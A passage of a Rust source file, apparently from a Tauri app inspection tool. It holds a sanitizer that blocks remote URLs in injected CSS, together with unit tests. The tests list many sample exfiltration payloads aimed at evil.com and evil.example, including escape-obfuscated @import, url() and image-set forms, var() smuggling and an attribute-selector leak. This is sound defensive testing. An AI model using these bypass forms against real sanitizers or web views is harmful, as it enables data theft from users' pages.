        }
    }
}

/// The URL parser's view of a CSS URL value: tabs and newlines removed anywhere, leading and
/// trailing C0 controls and spaces trimmed.
fn css_url_normalize(raw: &str) -> String {
    let no_tab_nl: String = raw
        .chars()
        .filter(|c| !matches!(c, '\t' | '\n' | '\r'))
        .collect();
    no_tab_nl.trim_matches(|c: char| c <= '\u{20}').to_string()
}

/// The scheme of a normalized URL (ASCII alpha, then alphanumerics / `+` / `-` / `.`, then
/// `:`), lowercased, and the rest after the colon.
fn css_url_scheme(url: &str) -> Option<(String, &str)> {
    let mut chars = url.char_indices();
    let (_, first) = chars.next()?;
    if !first.is_ascii_alphabetic() {
        return None;
    }
    for (i, c) in chars {
        if c == ':' {
            return Some((url[..i].to_ascii_lowercase(), &url[i + 1..]));
        }
        if !(c.is_ascii_alphanumeric() || matches!(c, '+' | '-' | '.')) {
            return None;
        }
    }
    None
}

/// Starts with two of `/` and `\` (a network-path reference; special schemes read `\` as `/`).
fn css_starts_with_authority(s: &str) -> bool {
    let mut it = s.chars();
    matches!((it.next(), it.next()), (Some('/' | '\\'), Some('/' | '\\')))
}

/// Check one URL-bearing value. `strict` (a URL position): only `data:` or a scheme-less
/// same-origin reference passes. Otherwise (a string that is not in a URL position, but could
/// reach one through `var()`): reject anything that can name a remote host.
fn css_check_url(raw: &str, strict: bool) -> Result<(), String> {
    let url = css_url_normalize(raw);
    let remote = if css_starts_with_authority(&url) {
        true
    } else if let Some((scheme, rest)) = css_url_scheme(&url) {
        if strict {
            scheme != "data"
        } else {
            SPECIAL_URL_SCHEMES.contains(&scheme.as_str()) || css_starts_with_authority(rest)
        }
    } else {
        false
    };
    if remote {
        return Err(format!(
            "a non-local URL is blocked in injected CSS (`{}` could fetch a remote origin — a \
             data-exfiltration vector). Only relative and data: URLs are allowed; pass \
             `allow_remote: true` to opt in.",
            url.chars().take(80).collect::<String>()
        ));
    }
    Ok(())
}

/// Validate CSS submitted to `css inject` before it is added to the page. By default this
/// rejects every construct that could fetch from a remote origin — a data-exfiltration / SSRF
/// channel, especially when chained with prompt injection from page-sourced content:
///
/// - `@import` in any form (it pulls a stylesheet);
/// - an unquoted `url(...)` or a string inside `url()`, `src()`, `image-set()` /
///   `-webkit-image-set()`, `image()`, `cross-fade()` that is not `data:` or a scheme-less
///   relative reference (`//host`, `\\host`, `https:host`, `blob:`, … are all rejected);
/// - any other string that names a remote host (`http(s)`/`ws(s)`/`ftp`/`file` scheme, or a
///   `//host` form), since a custom property can carry it into an image function via `var()`.
///
/// Comments, strings and escapes are tokenized as the browser does, so an escaped name
/// (`\75 rl(`), an escaped backslash (`\5c`), or a `/*` inside a string cannot hide a URL.
/// Relative refs, `data:` URIs, and `#fragment` refs are allowed. Set `allow_remote` to opt
/// back in to remote references when intentionally needed.
///
/// # Errors
/// Returns an error describing the rejected construct (or oversize input).
pub fn sanitize_injected_css(css: &str, allow_remote: bool) -> Result<(), String> {
    const MAX_CSS_LEN: usize = 256 * 1024;
    if css.len() > MAX_CSS_LEN {
        return Err(format!(
            "injected CSS too large ({} bytes, limit {MAX_CSS_LEN})",
            css.len()
        ));
    }
    if allow_remote {
        return Ok(());
    }
    let mut s = CssUrlScanner {
        chars: css_preprocess(css),
        pos: 0,
    };
    // Open functions / parentheses, innermost last (lowercased names; "" for a bare `(`).
    let mut open: Vec<String> = Vec::new();
    let in_url_function =
        |open: &[String]| open.iter().any(|f| CSS_URL_FUNCTIONS.contains(&f.as_str()));
    while let Some(c) = s.at(0) {
        match c {
            '/' if s.at(1) == Some('*') => {
                s.pos += 2;
                while s.pos < s.chars.len() && !(s.at(0) == Some('*') && s.at(1) == Some('/')) {
                    s.pos += 1;
                }
                s.pos = (s.pos + 2).min(s.chars.len());
            }
            '"' | '\'' => {
                s.pos += 1;
                let value = s.consume_string(c);
                css_check_url(&value, in_url_function(&open))?;
            }
            '@' if s.starts_ident_at(1) => {
                s.pos += 1;
                if s.consume_ident().eq_ignore_ascii_case("import") {
                    return Err(
                        "`@import` is blocked in injected CSS (it fetches a stylesheet — a \
                         data-exfiltration vector). Inline the rules, or pass `allow_remote: true`."
                            .to_string(),
                    );
                }
            }
            '(' => {
                s.pos += 1;
                open.push(String::new());
            }
            ')' => {
                s.pos += 1;
                open.pop();
            }
            _ if s.starts_ident_at(0) => {
                let name = s.consume_ident().to_ascii_lowercase();
                if s.at(0) == Some('(') {
                    s.pos += 1;
                    let mut ahead = 0;
                    while s.at(ahead).is_some_and(css_is_ws) {
                        ahead += 1;
                    }
                    if name == "url" && !matches!(s.at(ahead), Some('"' | '\'')) {
                        // An unquoted url token: always a URL position.
                        s.pos += ahead;
                        let value = s.consume_url();
                        css_check_url(&value, true)?;
                    } else {
                        open.push(name);
                    }
                }
            }
            _ => s.pos += 1,
        }
    }
    Ok(())
}

#[cfg(test)]
mod json_truthy_tests {
    use super::json_truthy;
    use serde_json::json;

    #[test]
    fn falsy_values() {
        assert!(!json_truthy(&json!(null)));
        assert!(!json_truthy(&json!(false)));
        assert!(!json_truthy(&json!(0)));
        assert!(!json_truthy(&json!(0.0)));
        assert!(!json_truthy(&json!("")));
        assert!(!json_truthy(&json!([])));
        assert!(!json_truthy(&json!({})));
    }

    #[test]
    fn truthy_values() {
        assert!(json_truthy(&json!(true)));
        assert!(json_truthy(&json!(1)));
        assert!(json_truthy(&json!(-1)));
        assert!(json_truthy(&json!("ready")));
        assert!(json_truthy(&json!([1])));
        assert!(json_truthy(&json!({ "k": "v" })));
    }
}

#[cfg(test)]
mod truncate_tests {
    use super::truncate_at_char_boundary;

    #[test]
    fn a_cut_inside_a_multibyte_character_backs_off_to_its_start() {
        // `"` + 3000 × `é`: byte 4096 is the second byte of an `é`.
        let s = format!("\"{}", "é".repeat(3000));
        assert!(!s.is_char_boundary(4096));
        let cut = truncate_at_char_boundary(&s, 4096);
        assert_eq!(cut.len(), 4095);
        assert!(cut.ends_with('é'));
        // 4-byte characters, every offset.
        let emoji = "🦀".repeat(10);
        for max in 0..=emoji.len() + 2 {
            let cut = truncate_at_char_boundary(&emoji, max);
            assert!(
                cut.len() <= max && cut.len().is_multiple_of(4),
                "{max}: {}",
                cut.len()
            );
        }
    }

    #[test]
    fn short_and_ascii_text_is_unchanged_or_cut_exactly() {
        assert_eq!(truncate_at_char_boundary("abc", 10), "abc");
        assert_eq!(truncate_at_char_boundary("abcdef", 3), "abc");
        assert_eq!(truncate_at_char_boundary("", 0), "");
    }
}

#[cfg(test)]
mod ghost_projection_tests {
    use super::ghost_ipc_projection_js;

    #[test]
    fn projects_whole_log_when_since_absent() {
        let js = ghost_ipc_projection_js(None);
        assert!(
            js.contains("getIpcLog(0, { bodies: false })"),
            "body-free view: {js}"
        );
        assert!(js.contains(".map("));
        // No time window applied.
        assert!(!js.contains("Date.now()"));
        assert!(!js.contains("c.timestamp"));
    }

    #[test]
    fn applies_window_when_since_positive() {
        let js = ghost_ipc_projection_js(Some(5000));
        assert!(js.contains("c.timestamp"));
        assert!(js.contains("Date.now() - 5000"));
        // Window is applied before the name projection.
        let win = js.find("Date.now()").unwrap();
        let map = js.find(".map(").unwrap();
        assert!(win < map, "time filter must run before the name map");
    }

    #[test]
    fn ignores_nonpositive_since() {
        assert!(!ghost_ipc_projection_js(Some(0)).contains("Date.now()"));
        assert!(!ghost_ipc_projection_js(Some(-10)).contains("Date.now()"));
    }
}

#[cfg(test)]
mod injected_css_tests {
    use super::sanitize_injected_css;

    #[test]
    fn blocks_at_import() {
        assert!(sanitize_injected_css("@import url(https://evil.com/x.css);", false).is_err());
        // Even hidden behind a comment.
        assert!(sanitize_injected_css("/* x */@import 'https://evil.com';", false).is_err());
        // Comment-splitting obfuscation is caught because comments are stripped first:
        // `@imp/* */ort` collapses to `@import`.
        assert!(sanitize_injected_css("@imp/* */ort url(//evil.com)", false).is_err());
    }

    #[test]
    fn blocks_remote_url() {
        assert!(
            sanitize_injected_css("body{background:url(https://evil.com/x?d=1)}", false).is_err()
        );
        assert!(sanitize_injected_css("body{background:url('//evil.com/x')}", false).is_err());
        assert!(sanitize_injected_css("a{cursor:url(ftp://evil.com/c)}", false).is_err());
    }

    #[test]
    fn allows_local_and_data() {
        assert!(sanitize_injected_css("body{color:red}", false).is_ok());
        assert!(sanitize_injected_css("body{background:url('/assets/x.png')}", false).is_ok());
        assert!(sanitize_injected_css("body{background:url(#grad)}", false).is_ok());
        assert!(
            sanitize_injected_css("body{background:url(data:image/png;base64,AAAA)}", false)
                .is_ok()
        );
    }

    #[test]
    fn allow_remote_opts_back_in() {
        assert!(sanitize_injected_css("@import url(https://fonts.example/x.css);", true).is_ok());
        assert!(
            sanitize_injected_css("body{background:url(https://cdn.example/x.png)}", true).is_ok()
        );
    }

    #[test]
    fn blocks_css_escape_obfuscated_import() {
        // `\40 import` decodes to `@import`; `\100 6d port` style hex escapes too.
        assert!(sanitize_injected_css("\\40 import url(https://evil.com/x.css);", false).is_err());
        assert!(sanitize_injected_css("\\000040import 'https://evil.com';", false).is_err());
        // `\@import` (backslash + literal char) also normalizes to `@import`.
        assert!(sanitize_injected_css("\\@import url(//evil.com)", false).is_err());
    }

    #[test]
    fn blocks_css_escape_obfuscated_remote_url() {
        // `\75 rl(` decodes to `url(` (hex escape + space-terminator).
        assert!(
            sanitize_injected_css("body{background:\\75 rl(https://evil.com/x)}", false).is_err()
        );
        // Escaped protocol-relative `//` via unambiguous 6-digit escapes (matches CSS
        // greedy hex parsing: `\2f` followed by a hex char would eat it, so a real
        // attacker uses the 6-digit or space-terminated form).
        assert!(
            sanitize_injected_css("body{background:url(\\00002f\\00002fevil.com/x)}", false)
                .is_err()
        );
    }

    #[test]
    fn escape_decoding_preserves_legitimate_css() {
        // A legitimately-escaped local content value must still pass.
        assert!(sanitize_injected_css("a::before{content:'\\2022'}", false).is_ok());
        assert!(sanitize_injected_css("body{color:red}", false).is_ok());
    }

    /// R5B-CSS1: every construct below resolves to a REMOTE origin in a real webview (WHATWG
    /// URL parsing against `tauri://localhost` / `http://tauri.localhost`), so each must be
    /// rejected. The old check only looked for a leading `//` or a `://` inside `url(...)`.
    #[test]
    fn r5b_css1_rejects_every_remote_form() {
        let remote = [
            // A special scheme needs no slashes: `https:evil.example/x` is https://evil.example/x.
            r"body{background:url(https:evil.example/x)}",
            r"body{background:url(HTTPS:evil.example/x)}",
            r"body{background:url(http:/evil.example/x)}",
            r#"body{background:url("https:evil.example/x")}"#,
            // `\5c` is a backslash, which special schemes read as `/`.
            r#"body{background:url("https:\5c\5c evil.example/x")}"#,
            r"body{background:url(\5c\5c evil.example/x)}",
            // (`\\` is an escaped backslash; a lone `\e` would be a hex escape.)
            r"body{background:url(/\\evil.example/x)}",
            r"body{background:url(\\/evil.example/x)}",
            r"body{background:url(\\\\evil.example/x)}",
            // Tabs / newlines are removed anywhere by the URL parser.
            "body{background:url(\"ht\\9 tps://evil.example/x\")}",
            "body{background:url(\"ht\\a tps://evil.example/x\")}",
            "body{background:url(\" //evil.example/x\")}",
            // Any scheme other than data: in a URL position.
            r"body{background:url(ws:evil.example)}",
            r"body{background:url(file:///etc/passwd)}",
            r"body{background:url(blob:https://evil.example/uuid)}",
            r"body{background:url(javascript:alert(1))}",
            // Image functions take bare strings as URLs.
            r#"body{background-image:image-set("https://evil.example/x" 1x)}"#,
            r#"input[value^=a]{background:-webkit-image-set("//evil.example/a" 1x)}"#,
            r#"body{background-image:image-set("https:evil.example/x" 1x)}"#,
            r#"body{background-image:image("https://evil.example/x")}"#,
            r#"body{background-image:cross-fade("https://evil.example/x", url(a.png) 50%)}"#,
            r#"body{background-image:-webkit-cross-fade("//evil.example/x", url(a.png), 50%)}"#,
            r#"body{background-image:src("https://evil.example/x")}"#,
            r#"body{background-image:image-set(type("image/png") "https://evil.example/x")}"#,
            // Escaped / uppercased function names.
            r#"body{background-image:IMAGE-SET("https://evil.example/x" 1x)}"#,
            r#"body{background-image:\69 mage-set("https://evil.example/x" 1x)}"#,
            r"body{background-image:U\52 L(https://evil.example/x)}",
            // A string reaching an image function through a custom property.
            r#":root{--u:"https://evil.example/x"} body{background:image-set(var(--u) 1x)}"#,
            r#":root{--u:"//evil.example/x"}"#,
            // `@import` in any form.
            r#"@import "a.css";"#,
            r"@IMPORT url(a.css);",
            r#"@\69mport "a.css";"#,
            // A comment opener inside a string / url must not hide what follows it.
            r#"a{content:"/*"} body{background:url(https://evil.example/x)} b{content:"*/"}"#,
            r"a{background:url(x/*)} body{background:url(https://evil.example/x)} /**/",
            // Unterminated url at EOF is still a url token.
            r"body{background:url(https://evil.example/x",
            // A NUL is U+FFFD to CSS; escaped NUL too — neither hides the scheme after it.
            "body{background:url(\"x\") url(https://evil.example/\u{0})}",
        ];
        for css in remote {
            assert!(
                sanitize_injected_css(css, false).is_err(),
                "must be rejected: {css}"
            );
            // The opt-in still lets it through.
            assert!(sanitize_injected_css(css, true).is_ok(), "{css}");
        }
    }

    #[test]
    fn r5b_css1_keeps_legitimate_css_working() {
        let local = [
            "body{color:red}",
            "a:hover{outline:2px solid #f00 !important}",
            "@media (max-width: 600px){.x{display:none}}",
            "@keyframes k{from{opacity:0}to{opacity:1}}",
            "@supports (display:grid){.g{display:grid}}",
            r"body{background:url(/assets/x.png)}",
            r"body{background:url(./x.png)}",
            r"body{background:url(../img/x.png)}",
            r"body{background:url(x.png?a=b#c)}",
            r#"body{background:url("img/x y.png")}"#,
            r"body{background:url(#grad)}",
            r"body{background:url()}",
            r#"body{background:url("")}"#,
            r"body{background:url(DATA:image/png;base64,AAAA)}",
            r#"body{background:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'/>")}"#,
            r#"body{background-image:image-set("a.png" 1x, "a@2x.png" 2x)}"#,
            r#"body{background-image:image-set(url(a.png) type("image/png") 1x)}"#,
            r#"@font-face{font-family:X;src:local("Arial Bold"),url(f.woff2) format("woff2")}"#,
            r#"a::before{content:"Warning: see docs"}"#,
            r#"a::before{content:"https is fine as text, not a URL"}"#,
            r#"a::after{content:"w: 100px"}"#,
            r#"q{quotes:"«" "»"}"#,
            r#"body{font-family:"Segoe UI", sans-serif}"#,
            r#".g{grid-template-areas:"a b" "c d"}"#,
            r"a::before{content:'\2022'}",
            // Comments anywhere, including ones that look like URLs.
            "/* https://evil.example */ body{color:red}",
            // `@import` as text is not an import.
            r#"a::before{content:"@import is blocked"}"#,
            // An ident merely containing `url`.
            r"body{--my-url:1px; transition:myurl(1s)}",
        ];
        for css in local {
            assert!(
                sanitize_injected_css(css, false).is_ok(),
                "must be allowed: {css} => {:?}",
                sanitize_injected_css(css, false)
            );
        }
    }
}

#[cfg(test)]
mod command_catalog_tests {
    use super::merge_command_catalog;
    use serde_json::json;
    use victauri_core::CommandInfo;

    fn entry(v: &serde_json::Value, name: &str) -> serde_json::Value {
        v.as_array()
            .unwrap()
            .iter()
            .find(|e| e["command"] == json!(name))
            .unwrap_or_else(|| panic!("no catalog entry for {name}"))
            .clone()
    }

    #[test]
    fn observed_commands_carry_shapes_and_stats_and_sort_by_call_count() {
        // Two commands seen on the wire; the busier one must sort first.
        let ipc = vec![
            json!({
                "command": "get_settings", "call_count": 4, "error_count": 0,
                "last_status": "ok",
                "arg_shape": "null",
                "result_shape": { "license": "object", "llm": { "model": "string" } },
            }),
            json!({
                "command": "open_url", "call_count": 9, "error_count": 1,
                "last_status": "ok",
                "arg_shape": { "url": "string" }, "result_shape": "null",
            }),
        ];
        let out = merge_command_catalog(&ipc, &[]);
        assert_eq!(out.len(), 2);
        // Busiest first.
        assert_eq!(out[0]["command"], json!("open_url"));
        assert_eq!(out[0]["observed"], json!(true));
        assert_eq!(out[0]["call_count"], json!(9));
        assert_eq!(out[0]["error_count"], json!(1));
        // The inferred arg shape is preserved verbatim — this is the agent-facing payoff.
        assert_eq!(out[0]["arg_shape"], json!({ "url": "string" }));
        let gs = entry(&json!(out), "get_settings");
        assert_eq!(gs["result_shape"]["llm"]["model"], json!("string"));
    }

    #[test]
    fn registered_but_unobserved_commands_are_included_with_metadata() {
        // A command in the #[inspectable] registry but never seen on the wire must still
        // appear (full command surface), flagged observed:false, with its metadata.
        let info = CommandInfo::new("rare_command")
            .with_description("does a rare thing")
            .with_intent("do the rare thing");
        let out = merge_command_catalog(&[], std::slice::from_ref(&info));
        assert_eq!(out.len(), 1);
        assert_eq!(out[0]["command"], json!("rare_command"));
        assert_eq!(out[0]["observed"], json!(false));
        assert_eq!(out[0]["call_count"], json!(0));
        assert_eq!(out[0]["description"], json!("does a rare thing"));
        assert_eq!(out[0]["intent"], json!("do the rare thing"));
        // No IPC-inferred shape for an unobserved command.
        assert!(out[0].get("arg_shape").is_none());
    }

    #[test]
    fn observed_command_is_enriched_with_registry_metadata_not_duplicated() {
        // Same command both observed AND registered → ONE entry, observed, with the
        // inferred shape PLUS the registry's authoritative declared metadata.
        let ipc = vec![json!({
            "command": "greet", "call_count": 2, "error_count": 0, "last_status": "ok",
            "arg_shape": { "name": "string" }, "result_shape": "string",
        })];
        let info = CommandInfo::new("greet").with_description("greets a user");
        let out = merge_command_catalog(&ipc, std::slice::from_ref(&info));
        assert_eq!(
            out.len(),
            1,
            "must not duplicate an observed+registered command"
        );
        assert_eq!(out[0]["observed"], json!(true));
        assert_eq!(out[0]["arg_shape"], json!({ "name": "string" }));
        assert_eq!(out[0]["description"], json!("greets a user"));
    }
}

#[cfg(test)]
mod ipc_timing_tests {
    use super::{ipc_timing_projection_js, ipc_timing_stats};
    use serde_json::json;

    #[test]
    fn projection_is_body_free() {
        let js = ipc_timing_projection_js(None);
        // Only command + duration are projected — never request/response bodies, so
        // the result stays under the eval cap on busy apps (the bug that made the old
        // full-getIpcLog coverage path return zero).
        assert!(js.contains("c.command"));
        assert!(js.contains("duration_ms"));
        assert!(!js.contains("result"));
        assert!(!js.contains("args"));
        assert!(!js.contains("Date.now()"));
        assert!(ipc_timing_projection_js(Some(5000)).contains("Date.now() - 5000"));
    }

    #[test]
    fn stats_aggregate_per_command_with_percentiles() {
        let entries = vec![
            json!({ "command": "get_settings", "duration_ms": 10.0 }),
            json!({ "command": "get_settings", "duration_ms": 30.0 }),
            json!({ "command": "get_settings", "duration_ms": 20.0 }),
            json!({ "command": "save", "duration_ms": 5.0 }),
        ];
        let stats = ipc_timing_stats(&entries);
        assert_eq!(stats.len(), 2);
        // Sorted by call_count desc — get_settings (3) first.
        assert_eq!(stats[0]["command"], "get_settings");
        assert_eq!(stats[0]["call_count"], 3);
        assert_eq!(stats[0]["timed_samples"], 3);
        assert_eq!(stats[0]["min_ms"], 10.0);
        assert_eq!(stats[0]["max_ms"], 30.0);
        assert_eq!(stats[0]["avg_ms"], 20.0);
        assert_eq!(stats[1]["command"], "save");
        assert_eq!(stats[1]["call_count"], 1);
    }

    #[test]
    fn pending_calls_count_but_do_not_skew_latency() {
        let entries = vec![
            json!({ "command": "run_pipeline", "duration_ms": null }),
            json!({ "command": "run_pipeline", "duration_ms": 100.0 }),
        ];
        let stats = ipc_timing_stats(&entries);
        assert_eq!(stats[0]["call_count"], 2);
        assert_eq!(stats[0]["timed_samples"], 1);
        assert_eq!(stats[0]["avg_ms"], 100.0);
    }

    #[test]
    fn empty_input_yields_empty_stats() {
        assert!(ipc_timing_stats(&[]).is_empty());
    }
}

#[cfg(test)]
mod ghost_report_tests {
    use super::{IpcOutcome, build_ghost_report};
    use victauri_core::{CommandInfo, CommandRegistry};

    fn outcome(command: &str, ok: bool, err: Option<&str>) -> IpcOutcome {
        IpcOutcome {
            command: command.to_string(),
            ok,
            err: err.map(str::to_string),
        }
    }

    #[test]
    fn succeeded_command_is_never_a_ghost() {
        // VIC-1, the exact 4DA false positive: `set_language` is a real command the app uses;
        // it returns success. The old registry-diff flagged it as a ghost (the app has an empty
        // #[inspectable] registry). Outcome-based detection must classify it as a verified
        // handler and NEVER place it in frontend_only.
        let registry = CommandRegistry::new(); // empty — the 4DA scenario
        let v = build_ghost_report(&[outcome("set_language", true, None)], &registry);
        assert_eq!(v["verified_handlers"], 1);
        assert!(
            v["frontend_only"].as_array().unwrap().is_empty(),
            "a command that returned success must not be a ghost"
        );
        assert!(v["confirmed_ghosts"].as_array().unwrap().is_empty());
    }

    #[test]
    fn framework_builtins_are_excluded() {
        // plugin:event|emit / plugin:updater|check are Tauri framework commands, never app ghosts.
        let registry = CommandRegistry::new();
        let outcomes = [
            outcome("plugin:event|emit", false, Some("some error")),
            outcome("plugin:updater|check", false, None),
        ];
        let v = build_ghost_report(&outcomes, &registry);
        assert!(v["frontend_only"].as_array().unwrap().is_empty());
        assert!(v["confirmed_ghosts"].as_array().unwrap().is_empty());
        assert_eq!(v["excluded_builtins"].as_array().unwrap().len(), 2);
    }

    #[test]
    fn not_found_error_is_a_confirmed_ghost() {
        // A frontend call to a command with no handler errors "not found" → confirmed ghost,
        // high confidence, registry-independent. Not double-listed in frontend_only.
        let registry = CommandRegistry::new();
        let v = build_ghost_report(
            &[outcome(
                "get_widgetz",
                false,
                Some("command get_widgetz not found"),
            )],
            &registry,
        );
        let confirmed = v["confirmed_ghosts"].as_array().unwrap();
        assert_eq!(confirmed.len(), 1);
        assert_eq!(confirmed[0]["name"], "get_widgetz");
        assert!(v["frontend_only"].as_array().unwrap().is_empty());
    }

    #[test]
    fn app_level_not_found_is_not_a_confirmed_ghost() {
        // A real command returning an application "X not found" error (here `get_user` →
        // "user not found") must NOT be mistaken for a missing-handler ghost: the message does
        // not reference the command/handler. It falls to the weak candidate tier instead.
        let registry = CommandRegistry::new();
        let v = build_ghost_report(
            &[outcome("get_user", false, Some("user not found"))],
            &registry,
        );
        assert!(
            v["confirmed_ghosts"].as_array().unwrap().is_empty(),
            "an app-level 'not found' must not be a confirmed ghost: {}",
            v["confirmed_ghosts"]
        );
        assert_eq!(v["frontend_only"].as_array().unwrap().len(), 1);
    }

    #[test]
    fn never_succeeded_unregistered_is_a_weak_candidate() {
        // Errored for a NON-not-found reason, not in registry, not a builtin, never succeeded:
        // a frontend_only candidate (weaker tier), not a confirmed ghost.
        let registry = CommandRegistry::new();
        let v = build_ghost_report(
            &[outcome(
                "save_thing",
                false,
                Some("validation failed: bad arg"),
            )],
            &registry,
        );
        assert!(v["confirmed_ghosts"].as_array().unwrap().is_empty());
        let fo = v["frontend_only"].as_array().unwrap();
        assert_eq!(fo.len(), 1);
        assert_eq!(fo[0]["name"], "save_thing");
    }

    #[test]
    fn registered_command_is_not_flagged_even_if_it_only_errored() {
        // A command present in the registry is known to exist; even if it only errored this
        // session it is never frontend_only.
        let registry = CommandRegistry::new();
        registry.register(CommandInfo::new("known_cmd"));
        let v = build_ghost_report(&[outcome("known_cmd", false, Some("oops"))], &registry);
        assert!(v["frontend_only"].as_array().unwrap().is_empty());
    }
}
